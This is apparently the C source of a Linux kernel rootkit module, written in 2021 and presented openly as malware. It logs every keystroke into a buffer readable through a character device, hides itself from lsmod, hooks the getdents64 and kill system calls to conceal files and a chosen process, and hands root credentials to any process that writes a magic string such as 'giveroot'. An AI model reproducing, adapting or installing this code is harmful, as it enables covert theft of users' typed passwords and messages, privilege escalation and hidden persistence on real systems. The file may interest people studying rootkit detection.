/*
Author - Ofir w
Date   - April,May, 2021

This kernel module is for keylogging, it will capture the keys using
the event notifier, it will then save the keys in the buffer. when the device will
be read it will read the keys from the buffer.

-----------------------------------------------------------------------------------------
*/

// Includes
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/notifier.h>
#include <linux/slab.h>
#include <linux/device.h>
#include <asm/unistd.h>

// Constants and gloval varibles:
#define DEVICE_NAME "hideme"
#define CLASS "rootkit"
#define BUFFER_LEN 1024
#define SIGNAL_TO_HIDE 64
static char pid_to_hide[] = "13337";
static char what_to_hide[] = "hideme"; 
static struct class*  device_class;
static struct device* device;
static int major;
static char buffer[BUFFER_LEN];
static char* buffer_ptr = buffer;
int buffer_pos=0;
static char give_root[] = "giveroot";
static char hide_proc[] = "hideproc";
static char show_proc[] = "showproc";
static char keys_magic[] = "givekeys";
static char hide_magic[] = "hidemodule";
static char show_magic[] = "showmodule";
static char hide_files[] = "hidefiles";
static char show_files[] = "showfiles";
static char givent_root[] = "leaveroot";
static char unkeys_magic[] = "hidekeys";
bool is_proc = true;
bool is_files = false;
bool is_root = false;
bool keys_permission=false;
bool hidden = false;
static struct cred *new_creds;
static struct list_head *prev_module;
static int log_keys(struct notifier_block*, unsigned long, void *);
static ssize_t read_device(struct file*, char*, size_t, loff_t*);
static ssize_t write_device(struct file*, const char*, size_t, loff_t*);
unsigned long (*kallsyms_lookup_name)(const char *name);
unsigned long *sys_call_tablee;
asmlinkage int (*orig_getdents64)(const struct pt_regs *regs);
asmlinkage int (*orig_kill)(const struct pt_regs *regs);
unsigned long kallsyms_lookup_addr;
module_param(kallsyms_lookup_addr, ulong, 0644);
MODULE_PARM_DESC(kallsyms_lookup_addr, "kallsyms_lookup address");
MODULE_LICENSE("GPL");

// File operations struct is used by the driver
static struct file_operations fops = {
	.owner = THIS_MODULE,
	.read = read_device,
	.write = write_device
};

// Dirent struct is used by the sys get dents
struct linux_dirent {
	unsigned long d_ino;     
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[];
};

// Notifier block used by the keyboard notifier
static struct notifier_block nb = {
	.notifier_call = log_keys
};

// This function shows the module in the lsmod command
static void show_module(void)
{
	if(hidden){
		list_add(&THIS_MODULE->list, prev_module);
		hidden = false;
	}
}

// This struct is the creds structure used by the task
static struct my_creds {
	int uid;
	int gid;
	int euid;
	int egid;
	int suid;
	int sgid;
	int fsuid;
	int fsgid;
} old_creds;

// This function saves the credentials of the task and commits the root credentials instead
static void get_root(void)
{
	if(!is_root)
    {
		new_creds = prepare_creds();
		if (new_creds == NULL)
			return;
		old_creds.uid = new_creds->uid.val;
		old_creds.gid = new_creds->gid.val;
		old_creds.euid = new_creds->euid.val;
		old_creds.egid = new_creds->egid.val;
		old_creds.suid = new_creds->suid.val;
		old_creds.sgid = new_creds->sgid.val;
		old_creds.fsuid = new_creds->fsuid.val;
		old_creds.fsgid = new_creds->fsgid.val;
		new_creds->uid.val = 0;
		new_creds->gid.val = 0;
		new_creds->euid.val = 0;
		new_creds->egid.val = 0;
		new_creds->suid.val = 0;
		new_creds->sgid.val = 0;
		new_creds->fsuid.val = 0;
		new_creds->fsgid.val = 0;
		commit_creds(new_creds);
		is_root = true;
	}
}

// This function loads the old credentials
static void leave_root(void)
{
	if(is_root)
	{
		if (new_creds == NULL)
			return;
		new_creds->uid.val = old_creds.uid;
		new_creds->gid.val = old_creds.gid;
		new_creds->euid.val = old_creds.euid;
		new_creds->egid.val = old_creds.egid;
		new_creds->suid.val = old_creds.suid;
		new_creds->sgid.val = old_creds.sgid;
		new_creds->fsuid.val = old_creds.fsuid;
		new_creds->fsgid.val = old_creds.fsgid;
		commit_creds(new_creds);
		is_root = false;
	}
}

// This function hides the module from the lsmod command
static void hide_module(void)
{
	if(!hidden)
	{
		prev_module = THIS_MODULE->list.prev;
		list_del(&THIS_MODULE->list);
		hidden = true;
	}
}
// This function changes address page to read write.
static int enable_writing(unsigned long address) {

        unsigned int level;
        pte_t *pte = lookup_address(address, &level);

        if (pte->pte &~ _PAGE_RW)
                pte->pte |= _PAGE_RW;
        

        return 0;
}

// This function changes address page to read only.
static int disable_writing(unsigned long address) {

        unsigned int level;
        pte_t *pte =  lookup_address(address, &level);;
        pte->pte = pte->pte &~_PAGE_RW;
        return 0;
}

// This is the hooked getdents function, it hides the files or the process.
asmlinkage int hooked_getdents(const struct pt_regs *regs) {
    struct linux_dirent *dirent = (struct linux_dirent *)regs->si;
    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;
    int ret = orig_getdents64(regs);
	int error;
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( ret <= 0 || dirent_ker == NULL )
	{
        kfree(dirent_ker);
		return ret;
	}
	error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
	{
		kfree(dirent_ker);
		return ret;
	}
    // Looping over the offset, incrementing by current_dir->d_reclen
    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;
		
		// Checking if the name is the file to hide and the flag is on.
        if ( is_files && strstr(current_dir->d_name, what_to_hide) != NULL)
        {
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        }
		// Checking if the name is the process and the flag is on.
		else if (is_proc && strstr(current_dir->d_name, pid_to_hide) != NULL)
		{
			if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
		}
        else
            previous_dir = current_dir;
        offset += current_dir->d_reclen;
    }
    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
	{
        kfree(dirent_ker);
		return ret;
	}
	return ret;

}

// This is the hooked kill function that hides the process that got the signal
asmlinkage int hooked_kill(const struct pt_regs *regs)
{
	pid_t pid ;
    int sig;
	pid = regs->di;
	sig = regs->si;
	
	// Checking if the signal sent is the signal to hide.
	if(sig == SIGNAL_TO_HIDE)
	{
		sprintf(pid_to_hide, "%d", pid);
		return 0;
	}
	return orig_kill(regs);
	
}
// This function will log the keys and save them in the buffer
static int log_keys(struct notifier_block *nb, unsigned long action, void *data)
{
	struct keyboard_notifier_param *param = data;
	
	// Checking if key was pressed and valedating it was ascii
	if (action == KBD_KEYSYM && param->down)
	{
		char c = param->value;
		
		// Checking if new message and then if regular ascii
		if (c == 0x01)
		{
			*(buffer_ptr++) = 0x0a;
			buffer_pos++;
		}
		else if (c >= 0x20 && c< 0x7f)
		{
			*(buffer_ptr++) = c;
			buffer_pos++;
		}
		
		// Checking if overflowing
		if (buffer_pos >= BUFFER_LEN)
		{
			buffer_pos = 0;
			memset(buffer, 0, BUFFER_LEN);
			buffer_ptr = buffer;
		}
	}
	return NOTIFY_OK;	
}



// This function reads from the device when sys_read is called
static ssize_t read_device(struct file* flip, char* user_buffer, size_t length, loff_t* offset)
{
	int bytes_to_read = strlen(buffer);
	int status;
	
	// Checking if magic was given
	if(keys_permission)
	{
		status = copy_to_user(user_buffer, buffer, bytes_to_read);
		
		// Checking status
		if(status)
		{
			return status;
		}
	}
	// Checking if read from before
	if (*offset > 0)
		return 0;
	*offset += bytes_to_read;
	return bytes_to_read;
}

static ssize_t write_device(struct file *flip, const char* user_buffer, size_t length, loff_t* offset) {
    char *data;
    size_t i;
    data = (char *)kmalloc(length+1, GFP_KERNEL);
    for(i = 0; i <= length; i++)
        data[i] = 0x00;
    
	// Checking if allocated memory succesfully
    if(data) {
        int status = copy_from_user(data, user_buffer, length);
		
		if(status)
			return status;
		
		// Checking if given the magic number
        if(memcmp(data, keys_magic, 8) == 0)
			keys_permission=true;
		if(memcmp(data, unkeys_magic, 8) == 0)
			keys_permission=false;
		if(memcmp(data, hide_magic, 10) == 0)
			hide_module();
		if(memcmp(data, show_magic, 10) == 0)
			show_module();
		if(memcmp(data, show_files, 9) == 0)
			is_files = false;
		if (memcmp(data, hide_files, 9) == 0)
		{
			is_files = true;
			enable_writing((unsigned long) sys_call_tablee);
			sys_call_tablee[__NR_getdents64] = (unsigned long) hooked_getdents;
			disable_writing((unsigned long) sys_call_tablee);
		}
		if(memcmp(data, give_root, 8) == 0)
			get_root();
		if(memcmp(data, givent_root, 9) == 0)
			leave_root();
		if(memcmp(data, hide_proc, 8) == 0)
		{
			is_proc = true;
			enable_writing((unsigned long) sys_call_tablee);
			sys_call_tablee[__NR_kill] = (unsigned long) hooked_kill;
			sys_call_tablee[__NR_getdents64] = (unsigned long) hooked_getdents;
			disable_writing((unsigned long) sys_call_tablee);
		}
		if(memcmp(data, show_proc, 8) == 0)
		{
			is_proc = false;
			enable_writing((unsigned long) sys_call_tablee);
			sys_call_tablee[__NR_kill] = (unsigned long) orig_kill;
			disable_writing((unsigned long) sys_call_tablee);
		}
		if(!is_files && !is_proc)
		{
			enable_writing((unsigned long) sys_call_tablee);
			sys_call_tablee[__NR_kill] = (unsigned long) orig_kill;
			sys_call_tablee[__NR_getdents64] = (unsigned long) orig_getdents64;
			disable_writing((unsigned long) sys_call_tablee);
		}
        kfree(data);
    }

    return length;
}
// First function called when modules is loaded
static int rootkit_init(void)
{
	
	// creating the device and registering it
	major = register_chrdev(0, DEVICE_NAME, &fops);
	if (major<0)
		return major;
	device_class = class_create(THIS_MODULE, CLASS);
	if (IS_ERR(device_class))
	{                
      unregister_chrdev(major, DEVICE_NAME);
      return PTR_ERR(device_class);
    }
    device = device_create(device_class, NULL, MKDEV(major, 0), NULL, DEVICE_NAME);
	if (IS_ERR(device))
	{
      class_destroy(device_class);
      unregister_chrdev(major, DEVICE_NAME);
      return PTR_ERR(device);
    }
	
	// hooking the sys calls functions
    kallsyms_lookup_name = (void*) kallsyms_lookup_addr;
	sys_call_tablee = (unsigned long*)(*kallsyms_lookup_name)("sys_call_table");
	orig_getdents64 = (void*) sys_call_tablee[__NR_getdents64];
	orig_kill = (void*) sys_call_tablee[__NR_kill];
    register_keyboard_notifier(&nb);
	memset(buffer, 0, BUFFER_LEN);
	return 0;
}

static void rootkit_exit(void)
{
	enable_writing((unsigned long) sys_call_tablee);
	sys_call_tablee[__NR_getdents64] = (unsigned long) orig_getdents64;
	sys_call_tablee[__NR_kill] = (unsigned long) orig_kill;
    disable_writing((unsigned long) sys_call_tablee);
	device_destroy(device_class, MKDEV(major, 0));
    class_unregister(device_class); 
    class_destroy(device_class);
	unregister_chrdev(major, DEVICE_NAME);
	unregister_keyboard_notifier(&nb);
}

module_init(rootkit_init);
module_exit(rootkit_exit);